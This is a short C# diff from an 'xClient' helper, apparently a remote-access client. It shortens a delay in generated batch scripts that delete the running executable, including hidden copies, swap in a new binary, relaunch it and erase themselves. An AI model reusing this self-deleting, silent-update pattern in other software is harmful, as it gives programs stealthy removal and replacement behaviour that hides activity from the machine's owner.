@@ -55,12 +55,12 @@ namespace xClient.Core.Helper
                 string uninstallBatch = (isFileHidden)
                     ? "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     : "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     ;
@@ -83,14 +83,14 @@ namespace xClient.Core.Helper
                 string uninstallBatch = (isFileHidden)
                     ? "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del /A:H " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "del " + "\"" + batchFile + "\""
                     : "@echo off" + "\n" +
                       "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
+                      "ping -n 10 localhost > nul" + "\n" +
                       "del " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "move " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
                       "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\n" +
